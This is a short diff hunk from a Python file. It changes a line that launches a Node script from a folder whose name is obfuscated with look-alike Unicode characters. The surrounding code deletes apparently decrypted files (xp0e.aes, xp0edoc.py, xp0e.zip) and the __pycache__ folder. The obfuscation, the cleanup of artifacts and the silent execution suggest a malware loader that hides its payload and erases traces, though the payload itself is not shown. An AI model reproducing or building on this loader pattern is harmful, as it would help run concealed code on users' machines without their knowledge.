@@ -161,7 +161,7 @@ if ᴠʟᴋʏʀᴇi is not None:
             os.remove("xp0e.aes")
             os.remove("xp0edoc.py")
             shutil.rmtree("__pycache__")
-            os.system('node --no-warnings Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊🎒𝕭𝖆𝖌/ӄ𝖚𝖓𝖆𝖎')
+            os.system('node --no-warnings --max-old-space-size=4096 Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊🎒𝕭𝖆𝖌/ӄ𝖚𝖓𝖆𝖎.js')
         else:
             os.remove("xp0e.zip")
             os.remove("xp0e.aes")
